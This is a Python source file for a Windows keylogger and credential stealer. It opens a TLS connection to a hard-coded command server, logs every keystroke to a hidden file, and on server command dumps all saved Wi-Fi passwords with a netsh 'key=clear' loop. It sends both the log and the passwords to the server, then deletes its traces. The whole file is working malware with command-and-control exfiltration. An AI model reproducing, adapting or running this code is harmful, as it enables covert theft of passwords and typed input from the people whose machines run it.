import socket
import ssl
import os
from pynput.keyboard import Key, Listener
import logging
import platform
import threading
import subprocess

CA_CERTIFICATE = """
-----BEGIN CERTIFICATE-----
MIIFWzCCA0OgAwIBAgIUari75NCqf8/CKW/N2pWRnf0lX7MwDQYJKoZIhvcNAQEL
BQAwPTELMAkGA1UEBhMCZWQxCzAJBgNVBAgMAmVkMSEwHwYDVQQKDBhJbnRlcm5l
dCBXaWRnaXRzIFB0eSBMdGQwHhcNMjQwMjEzMDc1NDQ3WhcNMjUwMjEyMDc1NDQ3
WjA9MQswCQYDVQQGEwJlZDELMAkGA1UECAwCZWQxITAfBgNVBAoMGEludGVybmV0
IFdpZGdpdHMgUHR5IEx0ZDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB
ALO/O5doUtSJdxpBNY+CMMfeEyA7hiCSFNyuJjpjGQGqS4Yu2QHuie22nVGKTjBO
hSdOsJmFovKptBqKCZuPPoeJeJz1O1VGudF2uhhRLmunW/DUncSFAiMX118tTSU1
PFKnPwWuCRtNVlxIKV2K834Bb94pNrOZllW99NoTpU5kKLooREegJ8PCjty1JHBq
mWoqwQ6CJiMmGtvCFB/TQ1fD8BuHGsF9olVg61XbCemIjHQ1UpncWaXOE/ips2Nz
3xumbqRQFWdbxFpCn8WowlGzBwfL7kFVtVEx8/zjbhTsBxNB1yOpRc7OEgMO7tvq
2Ew2vvpUvw1qk8hQVXc/KZvo3+yZiSI4FZrzcGPyzHJz/ZhByqN48QnvTaFZTak1
IYvHM+QIRuz5tYFLi+jgslGvwQBtLNWTD5yWZeoC3LplPqR4+BofJgo8G9fYJQcE
JP6mJzJnSY53a9fXEkCjtHH3HmNk2h++uHymJGk63TKrbytzh645v+nSIDhJ7hNW
pIHzgXz1+m8X30B1cHZTabc1SzCKafmR6Y8epTAw7Dtkoo0GbsJS9xfR0h23/3bP
H2ZG0yATraxUtHygaMZsmAWyXJ8i3Z7loOfSfDbqVkgO1lzQMBzJgx/rEonGysrZ
aVIkkoy4XIyaHGN1wyKAQ8/VcbeJLF+nyVX9XUcwRgJ5AgMBAAGjUzBRMB0GA1Ud
DgQWBBR4TOOZwAkTuO/ITd7PKIXpTWomODAfBgNVHSMEGDAWgBR4TOOZwAkTuO/I
Td7PKIXpTWomODAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4ICAQB4
8PhZ7BQ5lKQ2uTL2TpUgxe4JBDjo/LLCkDXhas0aLnpjtAiZnUYIAsNd1EXQMT5Z
R7rbPgKq2JOGlTc0KMo/RQhPGpz0u5cyUYeLKe2v2T81A5yEYyB92bPw0ZiEKKR9
CwJjuTNFh6jhsDT0XG0YBcATKxfn1EsOC7M/KjtAHNO6KpyvXwd+gCNujXC32r6B
r1E8OUrn1lpqogeDQ73cKM+CkUGIDkAFH18MZ0qzEftmy96DIUq86N1A2JLy0NFD
GrR3FeVKtrFd1JefaJEvmMJwlNTYS07jejU+mQGgGRhCSHQT6susrMpP8b++Lt2s
T+FgBg9n0nRmVkOiPynOx4MiUmHDCbK58M+diLeu1/Vicn/5HIgogU/c4MNwfD6H
JPBe7ZLLFsevEOsxd0z2f8YPq0kwKp+hJ/9lx3vx/hnCiLQS3aeSoxHrcbHgUav9
yb1oPbCL89xDkBk/+SlWgyjnvu4OeYtrHZYDotSGKC1E5t1ckD8nm3ZYt7ayJxGB
beVy2ecsMsxf/Ch6U2ttjy16/jTwWynOQEozN3qPmZknmXXXjZBOhchcsX0ezsau
rDM+eQmtMgcaTIlU/Ihypba74z0feotqSYuoMjlm/UZ6EWFfkPMwyO8ec7nv+sQ7
LCYcpP+Kya//WnEk5Jiq4pkAkL15g3tmAxge2WjZsA==
-----END CERTIFICATE-----
"""

def save_command_result(output_file):
    command = 'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear'
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    output, error = process.communicate()
    if error:
        print("An error occurred:", error)
    else:
        with open(output_file, 'w') as f:
            f.write(output)


def check_platform():
    return platform.system()


def find_ca_cert_path():
    for r, d, files in os.walk("c:\\"):
        for filename in files:
            if filename == "ca-cert.pem":
                path = os.path.join(r, filename)
                if path.endswith("SSL\\CA\\ca-cert.pem"):
                    return path
    return None


def os_check():
    current_platform = check_platform()
    if current_platform == 'Windows':
        return 'Windows'
    elif current_platform == 'Linux':
        return 'Linux'
    else:
        return None


def delete_hidden_file(file):
    os.remove(file)


def send_file(conn, filename):
    with open(filename, 'rb') as f:
        while True:
            chunk = f.read(1024)
            if not chunk:
                break
            conn.sendall(chunk)


def key_logger(hidden_file_path, client_ssl):
    logging.basicConfig(filename=hidden_file_path, level=logging.DEBUG, format="%(asctime)s - %(message)s")
    os.system(f"attrib +h {hidden_file_path}")

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        server_listener_thread = threading.Thread(target=listen_to_server, args=(client_ssl,))
        server_listener_thread.start()
        server_listener_thread.join()
        listener.stop()
        client_ssl.close()
        logging.shutdown()
        delete_hidden_file(hidden_file_path)
        exit(1)


def listen_to_server(client_ssl):
    while True:
        msg = client_ssl.recv(1024).decode()
        print(f"Server : {msg}")
        if msg == "STOP":
            print("stop")
            send_file(client_ssl, "its_a_trap.txt")
            exit(1)
        if msg == "WIFI":
            output_file = 'result.txt'
            save_command_result(output_file)
            send_file(client_ssl, output_file)
            delete_hidden_file(output_file)


def timeout_handler(client_ssl):
    print("Connection timed out after 10 minutes.")
    client_ssl.close()


def main():
    os_local = os_check()
    if os_local == 'Windows':
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.load_verify_locations(cadata=CA_CERTIFICATE)
        host = '10.56.182.51'  # Replace with the server IP
        port = 90
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
        client_ssl.connect((host, port))
        print("Client ON")

        while True:
            try:
                key_logger("its_a_trap.txt", client_ssl)

            except Exception as e:
                print(f"Error: {e}")
                break

        print("-- END --")
        client_ssl.close()
    else:
        print("Linux in maintenance")


if __name__ == "__main__":
    main()